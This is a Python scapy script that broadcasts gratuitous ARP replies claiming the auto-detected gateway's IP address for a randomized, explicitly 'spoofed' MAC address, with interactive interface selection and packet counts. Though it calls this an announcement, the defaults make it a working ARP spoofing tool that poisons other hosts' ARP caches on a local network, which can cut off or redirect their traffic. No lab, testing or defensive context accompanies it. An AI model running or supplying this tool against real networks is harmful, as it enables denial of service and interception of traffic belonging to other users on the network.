#!/usr/bin/env python3
"""
Sends gratuitous ARP announcing that an IP has a certain MAC address.
Features:
- Interactive interface selection
- Auto-detection of gateway IP
- Randomized spoofed MAC (unless --mac provided)
- Interactive prompt for packet count (unless -c used)
- Shows real-time sending progress for each packet
"""

import sys
import random
import time
from typing import List, Optional

try:
    from scapy.all import (
        ARP, Ether, sendp,
        get_if_list, get_if_hwaddr, get_if_addr,
        conf, IFACES
    )
except ImportError:
    print("Error: This script requires the 'scapy' library.")
    print("Install it with:  pip install scapy")
    sys.exit(1)


def random_mac() -> str:
    """Generate random locally administered unicast MAC"""
    mac = [random.randint(0x00, 0xff) for _ in range(6)]
    mac[0] &= 0xFE   # unicast
    mac[0] |= 0x02   # locally administered
    return ":".join(f"{b:02x}" for b in mac)


def get_interfaces() -> List[str]:
    try:
        if hasattr(IFACES, 'data'):
            return [name for name in IFACES.data if IFACES.data[name].is_valid()]
        return get_if_list()
    except Exception:
        return []


def get_gateway(iface: str) -> Optional[str]:
    conf.route.resync()
    local_ip = None
    try:
        if hasattr(IFACES, 'data'):
            obj = IFACES.data.get(iface)
            if obj:
                local_ip = obj.ip
    except:
        pass
    if not local_ip:
        try:
            local_ip = get_if_addr(iface)
        except:
            pass
    if not local_ip or local_ip == '0.0.0.0':
        return None

    for net, mask, gw, ifc, _, _ in conf.route.routes:
        if ifc == iface and net == 0 and mask == 0 and gw != '0.0.0.0':
            return gw

    parts = local_ip.split('.')
    if len(parts) == 4:
        return '.'.join(parts[:3]) + '.1'
    return None


def select_interface(interfaces: List[str]) -> Optional[str]:
    if not interfaces:
        print("No network interfaces found.")
        return None

    print("\nAvailable network interfaces:")
    print("-" * 70)
    for i, iface in enumerate(interfaces, 1):
        try:
            mac = get_if_hwaddr(iface)
            ip  = get_if_addr(iface)
            print(f" {i:2d}) {iface:18}   MAC: {mac:17}   IP: {ip or 'N/A'}")
        except:
            print(f" {i:2d}) {iface:18}   (info unavailable)")
    print("-" * 70)

    while True:
        try:
            choice = input(f"\nSelect interface (1–{len(interfaces)}): ").strip()
            if not choice:
                continue
            idx = int(choice) - 1
            if 0 <= idx < len(interfaces):
                selected = interfaces[idx]
                print(f"→ Selected: {selected}")
                return selected
            print(f"Enter number 1–{len(interfaces)}.")
        except ValueError:
            print("Please enter a valid number.")
        except KeyboardInterrupt:
            print("\nCancelled.")
            return None


def ask_packet_count(default: int = 6) -> int:
    while True:
        try:
            val = input(f"\nHow many ARP packets to send? [default {default}]: ").strip()
            if not val:
                return default
            count = int(val)
            if count < 1:
                print("Please enter 1 or more.")
                continue
            if count > 1000:
                print("Capping at 1000 packets.")
                return 1000
            return count
        except ValueError:
            print("Please enter a number.")
        except KeyboardInterrupt:
            print("\nCancelled.")
            sys.exit(1)


def send_gratuitous_arp(
    target_ip: str,
    new_mac: str,
    interface: str,
    count: int
):
    print(f"\nStarting transmission on {interface}")
    print(f"  Target IP : {target_ip}")
    print(f"  Announcing: {new_mac}")
    print(f"  Packets   : {count}\n")

    arp = ARP(
        op="is-at",
        psrc=target_ip,
        hwsrc=new_mac,
        pdst="255.255.255.255",
    )

    ether = Ether(
        dst="ff:ff:ff:ff:ff:ff",
        src=new_mac,
    )

    packet = ether / arp

    sent = 0
    try:
        for i in range(count):
            sendp(packet, iface=interface, verbose=0)
            sent += 1
            ts = time.strftime("%H:%M:%S")
            print(f"[{ts}] Sent packet {sent}/{count}  →  {target_ip} is-at {new_mac}")
            if i < count - 1:
                time.sleep(0.3)  # same inter-packet delay as before

        print(f"\nFinished — {sent} packet(s) sent successfully.")
    except PermissionError:
        print("\nError: This script requires root / admin privileges.")
        print("Try running with: sudo python3 this_script.py")
    except KeyboardInterrupt:
        print(f"\nInterrupted — {sent} packet(s) sent.")
    except Exception as e:
        print(f"\nError during sending: {e}")
        if sent > 0:
            print(f"Partial success — {sent} packet(s) sent before error.")


def main():
    import argparse

    parser = argparse.ArgumentParser(description="Send gratuitous ARP announcement")
    parser.add_argument("--ip", default="192.168.0.1",
                        help="IP to claim (default: auto-detect gateway)")
    parser.add_argument("--mac", default=None,
                        help="MAC to announce (default: random)")
    parser.add_argument("-c", "--count", type=int, default=None,
                        help="Number of packets (default: ask interactively)")
    parser.add_argument("-i", "--interface", default=None,
                        help="Interface (omit → interactive selection)")

    args = parser.parse_args()

    interfaces = get_interfaces()
    if not interfaces:
        print("No usable interfaces found. Try running with sudo.")
        return

    selected_iface = args.interface
    if selected_iface and selected_iface not in interfaces:
        print(f"Interface '{selected_iface}' not found.")
        selected_iface = None

    if not selected_iface:
        selected_iface = select_interface(interfaces)
        if not selected_iface:
            return

    # Target IP logic
    target_ip = args.ip
    if target_ip == parser.get_default("ip"):
        gw = get_gateway(selected_iface)
        if gw and gw != '0.0.0.0':
            target_ip = gw
            print(f"Auto-detected gateway: {target_ip}")
        else:
            print(f"Could not detect gateway → using {target_ip}")

    # MAC logic
    if args.mac:
        new_mac = args.mac
        print(f"Using provided MAC: {new_mac}")
    else:
        new_mac = random_mac()
        print(f"Generated random MAC: {new_mac}")

    # Count logic
    count = args.count if args.count is not None else ask_packet_count(default=6)

    # Go
    send_gratuitous_arp(
        target_ip=target_ip,
        new_mac=new_mac,
        interface=selected_iface,
        count=count
    )


if __name__ == "__main__":
    main()
